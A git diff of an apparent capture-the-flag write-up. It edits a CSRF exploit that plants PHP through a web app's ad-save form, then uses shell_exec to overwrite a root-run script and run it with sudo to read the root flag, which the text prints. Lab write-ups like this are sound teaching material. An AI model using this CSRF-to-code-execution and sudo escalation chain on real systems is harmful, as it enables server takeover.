@@ -60,9 +60,7 @@ If we look at the exploit on Exploit-DB, it looks like the following:
         <form action="http://10.10.60.2/content/as/?type=ad&mode=save" method="POST" name="exploit">
             <input type="hidden" name="adk" value="hacked"/>
             <textarea type="hidden" name="adv">
-                <?php
-                    echo '<h1> Hacked </h1>';
-                ?>
+                ... add php code here ...
             </textarea>;
         </form>
     </body>
@@ -87,22 +85,11 @@ In this case, we'll just continue to execute commands using the exploit though. 
 Next, we can look at the file using `cat /home/itguy/backup.pl` and we see that it simply calls `/etc/copy.sh`, which is a file we have access to. Now we have a way to get to the root flag - we overwrite the `/etc/copy.sh` file with a script for reading out the `/root/root.txt` file and we can do all of that in our CSRF exploit:
 
 ```php
-<html>
-    <body onload="document.exploit.submit();">
-        <form action="http://10.10.60.2/content/as/?type=ad&mode=save" method="POST" name="exploit">
-            <input type="hidden" name="adk" value="hackedy hacked"/>
-            <textarea type="hidden" name="adv">
-                <?php
-                    echo "<pre>$output</pre>";
-                    $output1 = shell_exec('echo "cat /root/root.txt > /etc/copy.sh"');
-                    echo "<pre>$output1</pre>";
-                    $output2 = shell_exec('sudo /usr/bin/perl /home/itguy/backup.pl');
-                    echo "<pre>$output2</pre>";
-                ?>
-            </textarea>;
-        </form>
-    </body>
-</html>
+echo "<pre>$output</pre>";
+$output1 = shell_exec('echo "cat /root/root.txt > /etc/copy.sh"');
+echo "<pre>$output1</pre>";
+$output2 = shell_exec('sudo /usr/bin/perl /home/itguy/backup.pl');
+echo "<pre>$output2</pre>";
 ```
 
 When we execute the exploit again, we get the root flag `THM{6637f41d0177b6f37cb20d775124699f}`.
